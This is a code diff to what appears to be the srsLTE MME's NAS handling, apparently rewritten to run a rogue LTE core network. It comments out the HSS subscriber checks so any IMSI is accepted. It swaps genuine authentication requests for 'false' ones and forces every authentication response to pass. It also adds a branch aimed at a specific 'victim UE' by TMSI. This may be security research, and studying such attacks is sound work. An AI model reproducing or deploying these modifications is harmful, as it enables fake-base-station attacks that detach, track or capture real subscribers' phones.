@@ -276,16 +276,17 @@ bool nas::handle_imsi_attach_request_unknown_ue(uint32_t                        
   nas_ctx->m_emm_ctx.attach_type = attach_req.eps_attach_type;
 
   // Get Authentication Vectors from HSS
-  if (!hss->gen_auth_info_answer(nas_ctx->m_emm_ctx.imsi,
-                                 nas_ctx->m_sec_ctx.k_asme,
-                                 nas_ctx->m_sec_ctx.autn,
-                                 nas_ctx->m_sec_ctx.rand,
-                                 nas_ctx->m_sec_ctx.xres)) {
-    nas_log->console("User not found. IMSI %015" PRIu64 "\n", nas_ctx->m_emm_ctx.imsi);
-    nas_log->info("User not found. IMSI %015" PRIu64 "\n", nas_ctx->m_emm_ctx.imsi);
-    delete nas_ctx;
-    return false;
-  }
+  // JJW_210311 : HSS always pass given IMSI attach reqeust
+  // if (!hss->gen_auth_info_answer(nas_ctx->m_emm_ctx.imsi,
+  //                                nas_ctx->m_sec_ctx.k_asme,
+  //                                nas_ctx->m_sec_ctx.autn,
+  //                                nas_ctx->m_sec_ctx.rand,
+  //                                nas_ctx->m_sec_ctx.xres)) {
+  //   nas_log->console("User not found. IMSI %015" PRIu64 "\n", nas_ctx->m_emm_ctx.imsi);
+  //   nas_log->info("User not found. IMSI %015" PRIu64 "\n", nas_ctx->m_emm_ctx.imsi);
+  //   delete nas_ctx;
+  //   return false;
+  // }
 
   // Allocate eKSI for this authentication vector
   // Here we assume a new security context thus a new eKSI
@@ -298,7 +299,10 @@ bool nas::handle_imsi_attach_request_unknown_ue(uint32_t                        
 
   // Pack NAS Authentication Request in Downlink NAS Transport msg
   nas_tx = pool->allocate();
-  nas_ctx->pack_authentication_request(nas_tx);
+
+  // JJW_210311 : pack false authentication request instead of real one
+  // nas_ctx->pack_authentication_request(nas_tx);
+  nas_ctx->pack_false_authentication_request(nas_tx);
 
   // Send reply to eNB
   s1ap->send_downlink_nas_transport(
@@ -859,9 +863,12 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
   srslte::byte_buffer_t* nas_tx = pool->allocate();
   //SJM : Send False NAS Authentication Request
  // if(m_tmsi == 0xd8647b0a)
-  if(false)
+ 
+  // JJW_210311 : Pass TAU Request if target is victim UE
+  if(m_tmsi == 0xf1440db9)
   {
-    nas_tmp.pack_false_authentication_request(nas_tx);
+    // nas_tmp.pack_false_authentication_request(nas_tx);
+    nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
   }else
   {
     nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
@@ -1012,6 +1019,10 @@ bool nas::handle_authentication_response(srslte::byte_buffer_t* nas_rx)
   }
 
   nas_tx = m_pool->allocate();
+
+  // JJW_210311 : Always pass authentication response by making ue_valid true
+  ue_valid = true;
+
   if (!ue_valid) {
     // Authentication rejected
     m_nas_log->console("UE Authentication Rejected.\n");
@@ -1180,11 +1191,12 @@ bool nas::handle_identity_response(srslte::byte_buffer_t* nas_rx)
   m_emm_ctx.imsi = imsi;
 
   // Get Authentication Vectors from HSS
-  if (!m_hss->gen_auth_info_answer(imsi, m_sec_ctx.k_asme, m_sec_ctx.autn, m_sec_ctx.rand, m_sec_ctx.xres)) {
-    m_nas_log->console("User not found. IMSI %015" PRIu64 "\n", imsi);
-    m_nas_log->info("User not found. IMSI %015" PRIu64 "\n", imsi);
-    return false;
-  }
+  // JJW_210311 : HSS always pass identity response from UE
+  // if (!m_hss->gen_auth_info_answer(imsi, m_sec_ctx.k_asme, m_sec_ctx.autn, m_sec_ctx.rand, m_sec_ctx.xres)) {
+  //   m_nas_log->console("User not found. IMSI %015" PRIu64 "\n", imsi);
+  //   m_nas_log->info("User not found. IMSI %015" PRIu64 "\n", imsi);
+  //   return false;
+  // }
   // Identity reponse from unknown GUTI atach. Assigning new eKSI.
   m_sec_ctx.eksi = 0;
 
@@ -1200,7 +1212,10 @@ bool nas::handle_identity_response(srslte::byte_buffer_t* nas_rx)
 
   // Pack NAS Authentication Request in Downlink NAS Transport msg
   nas_tx = m_pool->allocate();
-  pack_authentication_request(nas_tx);
+
+  // JJW_210311 : pack false authentication request instead of real one
+  // pack_authentication_request(nas_tx);
+  pack_false_authentication_request(nas_tx);
 
   // Send reply to eNB
   m_s1ap->send_downlink_nas_transport(m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx, m_ecm_ctx.enb_sri);
